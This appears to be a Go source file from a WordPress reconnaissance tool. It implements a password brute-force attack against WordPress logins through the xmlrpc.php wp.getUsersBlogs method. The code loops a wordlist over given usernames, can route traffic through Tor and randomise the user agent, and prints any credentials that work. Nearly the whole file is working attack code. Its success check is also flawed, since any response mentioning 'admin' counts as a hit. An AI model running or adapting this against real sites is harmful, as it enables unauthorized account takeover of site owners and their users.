package fuzzing

import (
	"bufio"
	"fmt"
	"io/ioutil"
	"os"
	"strings"

	"github.com/blackcrw/wprecon/pkg/gohttp"
	"github.com/blackcrw/wprecon/pkg/printer"
	"github.com/blackcrw/wprecon/tools/wordpress/commons"
)

// Login ::
type Login struct {
	HTTP          *gohttp.HTTPOptions
	Verbose       bool
	Method        string
	Usernames     string
	PasswordsFile string
	Force         bool
}

func (options *Login) Run() {
	if options.Method == "xml-rpc" || options.Method == "xmlrpc" {
		options.xmlrpc()
	} else {
		printer.Fatal("This method is not available.")
	}
}

func (options *Login) xmlrpc() {
	requests := func(username string, password string) (bool, error) {
		options.HTTP.URL.Directory = "xmlrpc.php"
		options.HTTP.Method = "POST"

		options.HTTP.Data = fmt.Sprintf(`<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>%s</value></param><param><value>%s</value></param></params></methodCall>`, username, password)

		response, err := gohttp.HTTPRequest(options.HTTP)

		if err != nil {
			return false, err
		}

		rawBytes, err := ioutil.ReadAll(response.Raw)

		if err != nil {
			printer.Fatal(err)
		}

		if !strings.Contains(string(rawBytes), "Incorrect username or password.") && string(rawBytes) != "" && response.StatusCode == 200 && strings.Contains(string(rawBytes), "'isAdmin': True") || strings.Contains(strings.ToLower(string(rawBytes)), "admin") {
			return true, nil
		} else {
			return false, nil
		}
	}

	check, err := commons.XMLRPC(options.HTTP.URL.Simple, options.HTTP.Options.RandomUserAgent, options.HTTP.Options.Tor, options.HTTP.Options.TLSCertificateVerify)

	if err != nil {
		printer.Fatal(err)
	}

	if !check && !options.Force {
		printer.Fatal("apparently this target does not have xmlrpc enabled.")
	}

	usernames := strings.Split(options.Usernames, ",")
	var linhas []string

	for _, username := range usernames {
		newtopline := printer.NewTopLine(":: Loading wordlist... ::")

		file, err := os.Open(options.PasswordsFile)

		if err != nil {
			printer.Fatal(err)
		}

		scanner := bufio.NewScanner(file)

		if len(linhas) <= 0 {
			for scanner.Scan() {
				linhas = append(linhas, scanner.Text())
			}
		}

		for key, password := range linhas {
			newtopline.Progress(len(linhas), "Username:", username, "— Password:", password)

			response, err := requests(username, password)

			if err != nil {
				newtopline.DownLine()

				printer.Fatal(err)
			}

			if response {
				newtopline.Done("Passoword Found!")
				printer.Done("Username:", username, "— Password:", password)
			} else if len(linhas) == key {
				newtopline.Danger("No password worked for the user:", username)
			}
		}

		file.Close()
	}

}
